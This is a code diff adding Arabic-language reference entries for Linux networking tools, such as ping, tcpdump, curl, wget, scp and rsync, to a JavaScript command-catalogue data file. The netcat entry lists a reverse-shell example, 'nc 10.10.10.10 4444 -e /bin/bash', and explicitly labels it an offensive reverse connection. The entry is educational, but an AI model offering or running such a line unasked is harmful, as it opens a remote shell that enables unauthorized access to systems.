@@ -145,5 +145,187 @@ window.LINUX_COMMANDS = (window.LINUX_COMMANDS || []).concat([
      {flag:'-i KEY',desc:'تحديد ملف المفتاح الخاص للاتصال'}
    ],
    examples:['sftp admin@192.168.1.10','sftp -P 2222 user@server.com'],
+  },
+  {id:'route',name:'route',icon:'🗺️',level:2,category:'Networking',
+   desc:'عرض وإدارة جدول توجيه حزم البيانات (IP Routing Table) الكلاسيكي بالنظام',
+   syntax:'route [OPTIONS]',
+   flags:[
+     {flag:'-n',desc:'عرض عناوين الـ IP رقمياً مباشرة وتجنب فك الأسماء لتسريع المخرجات'},
+     {flag:'add default gw IP',desc:'إضافة بوابة افتراضية (Default Gateway) جديدة للنظام'},
+     {flag:'del default gw IP',desc:'حذف البوابة الافتراضية المحددة'}
+   ],
+   examples:['route -n','sudo route add default gw 192.168.1.1'],
+  },
+  {id:'ping',name:'ping',icon:'📡',level:1,category:'Networking',
+   desc:'التحقق من اتصال وجودة وكفاءة وصول الخادم البعيد عبر إرسال حزم ICMP Echo Request',
+   syntax:'ping [OPTIONS] HOST',
+   flags:[
+     {flag:'-c N',desc:'إرسال N حزم فقط ثم التوقف تلقائياً'},
+     {flag:'-i N',desc:'تحديد الفاصل الزمني بالثواني بين إرسال الحزم (الافتراضي ثانية)'},
+     {flag:'-s SIZE',desc:'تحديد حجم حزمة البيانات بالبايتات المرسلة'},
+     {flag:'-t TTL',desc:'تحديد قيمة الـ Time To Live للحزمة الموجهة'}
+   ],
+   examples:['ping -c 4 google.com','ping -s 1200 8.8.8.8'],
+  },
+  {id:'ping6',name:'ping6',icon:'📡',level:2,category:'Networking',
+   desc:'نسخة مخصصة من أداة ping للتحقق من الاتصال وجودة الوصول عبر بروتوكول IPv6 المطور',
+   syntax:'ping6 [OPTIONS] HOST',
+   flags:[
+     {flag:'-I DEV',desc:'تحديد كارت الشبكة المطلوب استخدامه للإرسال (مهم لاتصال link-local)'}
+  ],
+   examples:['ping6 -c 4 ipv6.google.com','ping6 -I eth0 fe80::1'],
+  },
+  {id:'nmcli',name:'nmcli',icon:'⚙️',level:3,category:'Networking',
+   desc:'واجهة سطر الأوامر للتحكم بنظام NetworkManager لضبط كروت الشبكة والـ Wi-Fi والاتصالات بالكامل',
+   syntax:'nmcli [OPTIONS] OBJECT { COMMAND | help }',
+   flags:[
+     {flag:'device status',desc:'عرض حالة وتفاصيل كل كروت الشبكة الحالية'},
+     {flag:'connection show',desc:'سرد جميع ملفات الاتصال المخزنة والنشطة بالنظام'},
+     {flag:'connection up ID',desc:'تفعيل وتشغيل ملف اتصال محدد بالاسم أو الـ UUID'},
+     {flag:'connection down ID',desc:'إيقاف وتعطيل ملف اتصال نشط'},
+     {flag:'device wifi list',desc:'عرض شبكات الـ Wi-Fi المتاحة والمحيطة بالجهاز حالياً'}
+   ],
+   examples:['nmcli device status','nmcli connection show','sudo nmcli connection up "Home-WiFi"'],
+  },
+  {id:'iw',name:'iw',icon:'📡',level:3,category:'Networking',
+   desc:'الأداة الحديثة المعتمدة لإعداد وفحص الأجهزة والواجهات اللاسلكية Wi-Fi (بديل iwconfig)',
+   syntax:'iw [OPTIONS] OBJECT COMMAND',
+   flags:[
+     {flag:'dev',desc:'سرد وعرض كافة واجهات الـ Wi-Fi الحالية ومعرفاتها'},
+     {flag:'dev DEV scan',desc:'إجراء مسح شامل (Scan) للبحث عن الشبكات القريبة وتفاصيلها'},
+     {flag:'dev DEV info',desc:'عرض تفاصيل تكوين الواجهة الحالية ووضع عملها'}
+   ],
+   examples:['iw dev','sudo iw wlan0 scan | grep SSID'],
+  },
+  {id:'tcpdump',name:'tcpdump',icon:'🕵️',level:4,category:'Networking',
+   desc:'محلل وملتقط حزم البيانات التفاعلي الشامل للشبكات (Packet Sniffer & Analyzer)',
+   syntax:'tcpdump [OPTIONS] [EXPRESSION]',
+   flags:[
+     {flag:'-i DEV',desc:'تحديد كارت الشبكة المطلوب التقاط الحزم منه (مثال: -i eth0)'},
+     {flag:'-n',desc:'عدم ترجمة الـ IPs والأسماء وعرض الأرقام مباشرة لتفادي التأخير'},
+     {flag:'-c N',desc:'التقاط N حزم فقط والتوقف'},
+     {flag:'-w FILE.pcap',desc:'حفظ حزم البيانات الملتقطة في ملف pcap لتحليلها لاحقاً ببرنامج Wireshark'},
+     {flag:'-r FILE.pcap',desc:'قراءة وتحليل حزم ملف pcap مسجل مسبقاً'},
+     {flag:'-XX',desc:'طباعة محتويات وتفاصيل الحزمة بالكامل بصيغة الهكس والنصوص (Hex+ASCII)'},
+     {flag:'port N',desc:'فلترة الفحص لالتقاط الحزم الخاصة بالمنفذ N فقط (مثل port 80)'}
+   ],
+   examples:[
+     'sudo tcpdump -i eth0 -n -c 10',
+     'sudo tcpdump -i wlan0 -w traffic.pcap tcp port 443',
+     'sudo tcpdump -r traffic.pcap'
+   ],
+   note:'تحليل الشبكات: tcpdump هو الأداة رقم واحد لحل مشاكل الشبكات وفحص تدفقات البيانات المشبوهة أو الهجمات الجارية.'
+  },
+  {id:'netcat',name:'netcat (nc)',icon:'🔌',level:3,category:'Networking',
+   desc:'سكين الجيش السويسري للشبكات - أداة قراءة وكتابة البيانات عبر اتصالات TCP/UDP',
+   syntax:'nc [OPTIONS] HOST PORT',
+   flags:[
+     {flag:'-l',desc:'وضع الاستماع (Listen) لفتح منفذ واستقبال الاتصالات الواردة'},
+     {flag:'-p PORT',desc:'تحديد المنفذ المطلوب استخدامه (مع -l للاستماع أو بدون للاستعلام)'},
+     {flag:'-v',desc:'وضع تفصيلي (Verbose) لعرض تفاصيل محاولات الاتصال والنجاح'},
+     {flag:'-z',desc:'وضع مسح المنافذ (Zero-I/O) - للتحقق من فتح المنفذ دون إرسال بيانات'},
+     {flag:'-u',desc:'استخدام بروتوكول UDP بدلاً من TCP الافتراضي'},
+     {flag:'-e CMD',desc:'تنفيذ أمر مخصص وتوجيه مدخلاته ومخرجاته للمقبس (خطر جداً: Reverse Shell)'}
+   ],
+   examples:[
+     'nc -zv 192.168.1.10 20-80 # مسح سريع للمنافذ المفتوحة من 20 إلى 80',
+     'nc -l -p 4444 # فتح مستمع عادي على منفذ 4444',
+     'nc 10.10.10.10 4444 -e /bin/bash # اتصال عكسي هجومي كلاسيكي'
+   ],
+   note:'⚠️ تنبيه أمني: بعض توزيعات لينكس الحديثة تحذف خيار -e لأسباب أمنية لمنع استخدامه السهل في الاختراق.'
+  },
+  {id:'dig',name:'dig',icon:'🔍',level:2,category:'Networking',
+   desc:'الاستعلام التفاعلي المتقدم عن سجلات الـ DNS (Domain Information Groper)',
+   syntax:'dig [OPTIONS] @server DOMAIN [TYPE]',
+   flags:[
+     {flag:'+short',desc:'عرض النتيجة الصافية (مثل الـ IP فقط) لتسهيل معالجتها برمجياً'},
+     {flag:'ANY',desc:'طلب استرجاع جميع السجلات المتاحة للنطاق بالوقت نفسه'},
+     {flag:'TXT / MX / A',desc:'تحديد نوع السجل المطلوب (بريد، نصوص، عنوان)'}
+   ],
+   examples:[
+     'dig google.com',
+     'dig @8.8.8.8 example.com MX # الاستعلام من سيرفر DNS محدد لجوجل',
+     'dig example.com TXT +short'
+   ],
+  },
+  {id:'host',name:'host',icon:'🔍',level:1,category:'Networking',
+   desc:'أداة بسيطة وسريعة لإجراء استعلامات الـ DNS ومطابقة النطاقات مع الـ IPs والعكس',
+   syntax:'host [OPTIONS] TARGET',
+   flags:[
+     {flag:'-t TYPE',desc:'تحديد نوع سجل الـ DNS المطلوب (مثل A, MX, NS)'}
+   ],
+   examples:['host google.com','host 8.8.8.8 # عكس المطابقة (Reverse lookup)'],
+  },
+  {id:'nslookup',name:'nslookup',icon:'🔍',level:1,category:'Networking',
+   desc:'الأداة الكلاسيكية الشهيرة لفحص واستعلام خوادم وسجلات الـ DNS (تفاعلية وغير تفاعلية)',
+   syntax:'nslookup DOMAIN [DNS_SERVER]',
+   flags:[],
+   examples:['nslookup yahoo.com','nslookup google.com 1.1.1.1'],
+  },
+  {id:'curl',name:'curl',icon:'🌐',level:1,category:'Networking',
+   desc:'أداة قوية لنقل البيانات من وإلى الخوادم البعيدة وتدعم بروتوكولات عديدة (HTTP, HTTPS, FTP...)',
+   syntax:'curl [OPTIONS] URL',
+   flags:[
+     {flag:'-o FILE',desc:'حفظ ناتج الطلب في ملف محدد بدلاً من طباعته على الشاشة'},
+     {flag:'-O',desc:'حفظ الملف بنفس اسمه البعيد على السيرفر'},
+     {flag:'-I',desc:'طلب ترويسات الـ HTTP فقط (Headers) دون تحميل محتوى الصفحة'},
+     {flag:'-H "HEADER"',desc:'إرسال ترويسة مخصصة مع الطلب (مثالي لاختبار الـ APIs)'},
+     {flag:'-X METHOD',desc:'تحديد طريقة الطلب (مثل GET, POST, PUT, DELETE)'},
+     {flag:'-d "DATA"',desc:'إرسال بيانات مخصصة في جسم الطلب (POST data)'},
+     {flag:'-L',desc:'تتبع التحويلات التلقائية للصفحة (Redirections)'},
+     {flag:'-k / --insecure',desc:'تجاهل التحقق من شهادة الـ SSL/TLS غير الموثوقة'}
+   ],
+   examples:[
+     'curl -I https://google.com',
+     'curl -o test.html https://example.com/page.html',
+     'curl -X POST -d "param1=value1" https://api.internal/v1/auth'
+   ],
+  },
+  {id:'wget',name:'wget',icon:'📥',level:1,category:'Networking',
+   desc:'أداة تنزيل وتحميل الملفات من الويب وتدعم الاستئناف والتنزيل التكراري للمواقع بالكامل',
+   syntax:'wget [OPTIONS] URL',
+   flags:[
+     {flag:'-O FILE',desc:'تحديد اسم الملف المحفوظ محلياً'},
+     {flag:'-c',desc:'استئناف تحميل ملف تم إيقافه مسبقاً (Continue)'},
+     {flag:'-r',desc:'تنزيل تكراري للموقع بالكامل (Recursive) - مفيد لسحب الصفحات'},
+     {flag:'--limit-rate=RATE',desc:'تحديد أقصى سرعة تحميل مسموح بها (مثل 500k)'},
+     {flag:'--no-check-certificate',desc:'تجاهل التحقق من شهادات الحماية الرقمية'}
+   ],
+   examples:[
+     'wget https://example.com/file.zip',
+     'wget -c https://example.com/huge_iso.iso',
+     'wget --limit-rate=100k https://example.com/file.pdf'
+   ],
+  },
+  {id:'scp',name:'scp',icon:'🚚',level:2,category:'Remote Access',
+   desc:'نسخ ونقل الملفات بأمان بين الأجهزة البعيدة عبر الشبكة باستخدام بروتوكول SSH (Secure Copy)',
+   syntax:'scp [OPTIONS] SOURCE DEST',
+   flags:[
+     {flag:'-P PORT',desc:'تحديد منفذ SSH مخصص (وليس -p)'},
+     {flag:'-r',desc:'نسخ المجلدات بالكامل تكرارياً (Recursive)'},
+     {flag:'-i KEY',desc:'تحديد ملف المفتاح الخاص (Identity file) للمصادقة'},
+     {flag:'-p',desc:'الحفاظ على أوقات التعديل والصلاحيات الأصلية للملف'}
+   ],
+   examples:[
+     'scp local.txt user@192.168.1.50:/home/user/',
+     'scp -r user@server.com:/var/www/html/ ./local_backup/',
+     'scp -P 2222 -i id_rsa secure.zip root@10.0.0.1:/root/'
+   ],
+  },
+  {id:'rsync',name:'rsync',icon:'🔄',level:3,category:'System Administration',
+   desc:'أداة مزامنة ونقل الملفات الذكية والسريعة للغاية محلياً وبعيداً (تعتمد على الفروقات فقط)',
+   syntax:'rsync [OPTIONS] SOURCE DEST',
+   flags:[
+     {flag:'-a',desc:'وضع الأرشفة (يحافظ على الصلاحيات، المالك، الروابط الرمزية، والتوقيت)'},
+     {flag:'-v',desc:'عرض تفاصيل الملفات الجاري نقلها ومزامنتها (Verbose)'},
+     {flag:'-z',desc:'ضغط البيانات أثناء النقل لتسريع المزامنة عبر الشبكة'},
+     {flag:'--delete',desc:'حذف الملفات من الوجهة إذا لم تكن موجودة في المصدر لضمان المطابقة التامة'},
+     {flag:'--exclude=PATTERN',desc:'استثناء ملفات أو مجلدات معينة من المزامنة (مثل *.tmp)'},
+     {flag:'--progress',desc:'عرض شريط التقدم الفعلي للعملية بالتفصيل'}
+   ],
+   examples:[
+     'rsync -avz /var/www/html/ /backup/www/',
+     'rsync -avz --delete -e "ssh -p 2222" local/ user@remote:/remote/dir/'
+   ],
   }
 ]);
